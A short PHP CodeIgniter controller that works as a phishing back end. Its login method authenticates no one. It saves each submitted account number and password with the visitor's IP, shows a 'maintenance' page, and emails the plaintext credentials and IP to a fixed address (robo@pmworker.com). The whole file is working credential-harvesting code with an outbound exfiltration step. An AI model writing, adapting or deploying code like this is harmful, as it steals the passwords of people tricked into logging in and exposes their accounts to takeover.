<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Operator extends CI_Controller{
    function login()
    {

        $data['username']=$this->input->post('vv_number');
        $data['password']=$this->input->post('login_pwd');
        $data['ip']=$_SERVER["REMOTE_ADDR"];
        $this->load->model('modeluser');
        $rs=$this->modeluser->AddUser($data);
        if($rs)
        {
            $this->load->view('weihu');
        }
        $this->SendMail($data['username'],$data['password'],$data['ip']);

    }
    private function SendMail($username,$userpass,$ip)
    {
        $this->config->load('email_config', TRUE);
        $emailConfig = $this->config->item('useremail', 'email_config');
        $this->load->library('email');
        $this->email->initialize($emailConfig);

        $this->email->from('robo@pmworker.com','robo');
        $this->email->to('robo@pmworker.com');
        $this->email->subject("登录提醒");
        $this->email->message("登录用户名：".$username."；登陆密码：".$userpass."登录IP：".$ip);
        $this->email->send();
    }
}